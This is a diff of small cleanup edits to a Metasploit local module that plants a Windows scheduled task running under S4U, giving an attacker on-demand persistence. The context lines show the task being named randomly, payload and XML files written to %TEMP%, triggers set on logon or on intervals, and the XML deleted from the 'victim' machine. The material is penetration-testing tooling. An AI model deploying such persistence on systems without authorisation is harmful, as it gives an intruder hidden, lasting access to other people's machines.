@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Exploit::Local
 			'Description'   => %q{
 				Creates a scheduled task that will run using service-for-user (S4U).
 				This allows the scheduled task to run even as an unprivileged user
-				that is not logged into the device. This will result in lower security 
+				that is not logged into the device. This will result in lower security
 				context, allowing access to local resources only. The module
 				requires 'Logon as a batch job' permissions (SeBatchLogonRight).
 			},
@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Exploit::Local
 			'Targets'       => [ [ 'Windows', {} ] ],
 			'DefaultTarget' => 0,
 			'References'     => [
-				[ 'URL', 'http;//www.pentestgeek.com'], # ADD FULL LINK
+				[ 'URL', 'http://www.pentestgeek.com/2013/02/11/scheduled-tasks-with-s4u-and-on-demand-persistence/'],
 				[ 'URL', 'http://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/']
 			]
 		))
@@ -103,7 +103,7 @@ class Metasploit3 < Msf::Exploit::Local
 			return
 		end
 
-		# Name task with Opt
+		# Name task with Opt or give random name
 		schname = datastore['RTASKNAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
 
 		# Create task with modified XML
@@ -136,7 +136,7 @@ class Metasploit3 < Msf::Exploit::Local
 		path = datastore['PATH'] || session.fs.file.expand_path("%TEMP%")
 		xml_path = "#{path}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.xml"
 		rexe_path = "#{path}\\#{rexename}"
-		return xml_path,rexe_path			
+		return xml_path,rexe_path
 	end
 
 	##############################################################
@@ -198,11 +198,11 @@ class Metasploit3 < Msf::Exploit::Local
 
 	##############################################################
 	# Takes the XML, alters it based on trigger specified. Will also
-	# add in expiration tag if used. 
+	# add in expiration tag if used.
 	# Returns the modified XML
 
 	def add_xml_triggers(xml)
-		# Insert trigger 
+		# Insert trigger
 		case datastore['TRIGGER']
 			when 'logon'
 				# Trigger based on winlogon event, checks windows license key after logon
@@ -236,7 +236,7 @@ class Metasploit3 < Msf::Exploit::Local
 				end
 				xml = xml.sub(/<Interval>.*?</, "<Interval>PT#{minutes}M<")
 
-				# Generate expire tag, insert into XML
+				# Generate expire tag
 				end_boundary = create_expire_tag if datastore['EXPIRE_TIME']
 
 				# Inject expire tag
@@ -363,7 +363,7 @@ class Metasploit3 < Msf::Exploit::Local
 			print_status("#{"To delete task:".ljust(20)} #{del_task}")
 			print_status("#{"To delete payload:".ljust(20)} del #{rexe_path}")
 			del_task << "\ndel #{rexe_path}"
-			
+
 			# Delete XML from victim
 			delete_file(path)
 
